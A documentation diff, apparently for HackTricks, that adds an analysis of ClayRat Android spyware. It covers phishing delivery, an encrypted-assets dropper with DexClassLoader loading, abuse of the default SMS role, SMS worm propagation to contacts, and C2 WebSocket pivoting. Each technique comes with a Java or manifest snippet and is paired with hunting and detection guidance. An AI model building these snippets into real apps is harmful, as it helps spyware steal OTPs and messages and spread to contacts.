@@ -429,6 +429,124 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - Detect installation/launch of an external NFC-relay app triggered by another app.
 - For banking: enforce out-of-band confirmations, biometrics-binding, and transaction-limits resistant to on-device automation.
 
+---
+
+## Android SMS role abuse, session-based droppers with encrypted assets, and C2 obfuscation – ClayRat tradecraft
+
+ClayRat is a fast-evolving Android spyware family distributed via look‑alike sites and Telegram channels. Below are reusable techniques observed in the campaign that defenders and red-teamers should model and hunt for.
+
+### Delivery funnel: lookalike site → Telegram → APK
+- Phishing pages impersonate popular apps/services and include step-by-step instructions to enable Unknown Sources on Android.
+- Users are redirected to Telegram channels seeded with testimonials/metrics before receiving the APK link. This social proof reduces suspicion.
+
+### Session-based installer: encrypted payload in assets + fake Play update UI
+- The first-stage app presents a fake “Google Play update/verification” screen.
+- The functional spyware is stored as an encrypted blob under `/assets/` and decrypted only at runtime, then dynamically loaded.
+- Packed variants hide most logic until decryption, hampering static analysis.
+
+Static triage ideas
+- Unzip and look for large opaque blobs under `assets/` whose entropy is high.
+- Instrument filesystem to catch a DEX/ZIP written to app-internal storage just before `DexClassLoader`/`PathClassLoader` usage.
+- APKiD often shows “packer/loader” hints; network traffic may be minimal until decryption completes.
+
+<details>
+<summary>Example: AES‑GCM decrypt from assets and load with DexClassLoader</summary>
+
+```java
+// 1) Read encrypted payload from assets
+byte[] enc = readAll(getAssets().open("payload.enc"));
+byte[] iv  = Arrays.copyOfRange(enc, 0, 12);
+byte[] ct  = Arrays.copyOfRange(enc, 12, enc.length);
+
+// 2) Decrypt (key could be hardcoded/derived from device info)
+SecretKey key = new SecretKeySpec(deriveKey(), "AES");
+Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
+c.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));
+byte[] dexBytes = c.doFinal(ct);
+
+// 3) Persist DEX and dynamically load
+File outDex = new File(getCodeCacheDir(), "p.dex");
+Files.write(outDex.toPath(), dexBytes);
+DexClassLoader cl = new DexClassLoader(outDex.getPath(), getCodeCacheDir().getPath(), null, getClassLoader());
+Class<?> core = cl.loadClass("com.spy.core.Main");
+core.getMethod("start", Context.class).invoke(core.getConstructor().newInstance(), this);
+```
+</details>
+
+### Privilege consolidation via the default SMS handler role
+Requesting the device’s default SMS app role consolidates powerful capabilities behind a single consent dialog on modern Android (instead of individual runtime prompts): read/send/intercept SMS, and direct DB access. Malware leverages this to silently mass-message, steal OTPs, and exfiltrate SMS at scale.
+
+Minimal request flow (Android 10+):
+
+```java
+RoleManager rm = (RoleManager) getSystemService(Context.ROLE_SERVICE);
+if (rm.isRoleAvailable(RoleManager.ROLE_SMS) && !rm.isRoleHeld(RoleManager.ROLE_SMS)) {
+    Intent i = rm.createRequestRoleIntent(RoleManager.ROLE_SMS);
+    startActivityForResult(i, 1001);
+}
+```
+
+Hunting/detection
+- Alert when the default SMS handler changes to an untrusted package.
+- Monitor immediate spikes in `SEND_SMS` usage and access to `content://sms` following role grant.
+
+### Worm-like propagation via contact list
+Once SMS and contacts are accessible, the implant mass-sends lures to every contact from the victim’s number.
+
+```java
+Cursor c = getContentResolver().query(
+    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+    new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
+SmsManager sms = SmsManager.getDefault();
+while (c.moveToNext()) {
+  String num = c.getString(0);
+  sms.sendTextMessage(num, null, "Узнай первым! <link>", null, null);
+}
+```
+
+### Event‑driven control: BroadcastReceivers for SMS and calls
+Receivers enable reactive execution without a foreground service.
+
+Manifest sketch:
+
+```xml
+<receiver android:name=".SmsRx" android:exported="true">
+  <intent-filter>
+    <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+  </intent-filter>
+</receiver>
+<receiver android:name=".OutCall" android:exported="true">
+  <intent-filter>
+    <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+  </intent-filter>
+</receiver>
+```
+
+Observed actions include immediate front‑camera capture and upload on first run, full SMS dump, call log exfiltration, and commandable call placement.
+
+### C2 traffic protection, markers, and proxy/WebSocket pivot
+- Early variants obfuscate with Base64 and inject the marker string `apezdolskynet` in payloads (plaintext visible after decode). Hunt for this artifact in HTTP bodies.
+- Later builds encrypt telemetry and tasking with **AES‑GCM** and keep logic packed until runtime.
+- Resilient comms: a command like `get_proxy_data` returns an HTTP/HTTPS endpoint which is converted to a (secure) WebSocket and augmented with a device ID; tasks are scheduled periodically/delayed to keep the channel alive.
+
+```java
+String cfg = httpGet(c2+"/get_proxy_data"); // returns e.g., https://c2.tld/path
+Uri u = Uri.parse(cfg);
+String ws = ("https".equals(u.getScheme()) ? "wss" : "ws") + "://" + u.getHost() +
+            (u.getPort()!=-1?":"+u.getPort():"") + u.getPath() + "?id=" + deviceId;
+// connect(ws); schedule heartbeat/retry tasks
+```
+
+### DFIR/Hunting checklist (ClayRat-style)
+- Network: flag HTTP POST bodies that Base64‑decode to include `apezdolskynet`.
+- Role events: monitor/alert on default SMS handler changes; look for mass‑SMS bursts.
+- APK triage: encrypted blobs in `/assets/` with runtime `DexClassLoader` usage; fake Play update UI.
+- Components: receivers for `SMS_RECEIVED` and `NEW_OUTGOING_CALL` in untrusted apps.
+- Behaviour: front camera used immediately after first grant; exfil of SMS, call logs, notifications.
+- Hygiene: ensure Play Protect is enabled; deploy mobile EDR/MTD and block sideloading where possible.
+
+---
+
 ## References
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
@@ -440,5 +558,10 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [ClayRat: A New Android Spyware Targeting Russia](https://zimperium.com/blog/clayrat-a-new-android-spyware-targeting-russia)
+- [ClayRat IOCs – Zimperium GitHub](https://github.com/Zimperium/IOC/tree/master/2025-10-ClayRat)
+- [Android dangerous permissions overview](https://developer.android.com/guide/topics/permissions/overview#dangerous_permissions)
+- [RoleManager (default SMS app role)](https://developer.android.com/reference/android/app/role/RoleManager)
+- [Google Play Protect overview](https://support.google.com/googleplay/answer/2812853?hl=en)
 
 {{#include ../../banners/hacktricks-training.md}}
